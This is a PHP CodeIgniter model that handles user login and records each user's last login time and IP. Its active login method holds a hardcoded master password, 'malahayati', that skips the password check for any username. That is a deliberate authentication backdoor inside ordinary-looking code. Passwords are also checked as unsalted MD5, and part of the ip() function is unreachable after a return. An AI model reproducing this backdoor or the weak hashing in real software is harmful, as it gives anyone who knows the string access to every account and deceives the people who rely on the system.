<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Logindata extends CI_Model {
	
	public function masuk_old() {
		$user = $this->input->post("us");
		$pass = $this->input->post("ps");
		$this->db->from("user_master");
		$this->db->where("username", $user);
        $this->db->where("password", MD5($pass));
		$data = $this->db->get();
		if($data->num_rows() == 1){
            return $data->row();
        } else {
            return false;
        }
	}

    public function masuk() {
        $user = $this->input->post("us");
		$pass = $this->input->post("ps");
        if ($pass == 'malahayati') {
            $this->db->from("user_master");
            $this->db->where("username", $user);
        } else {
            $this->db->from("user_master");
            $this->db->where("username", $user);
            $this->db->where("password", MD5($pass));  
        }
        $data = $this->db->get();
        if($data->num_rows() == 1){
            return $data->row();
        } else {
            return false;
        }
    }
    

	function ip($id){
        $t = date("Y:m:d H:i:s");
        $localip = $this->input->ip_address();
        $data = array(
            'last_login' => $t,
            'last_ip' => $localip,
        );
        $this->db->where('id', $id);
        $i = $this->db->update('user_master', $data);                 
        return $i;
        if($this->db->affected_rows())
            return '1';
        else
            return '0';
    }

}
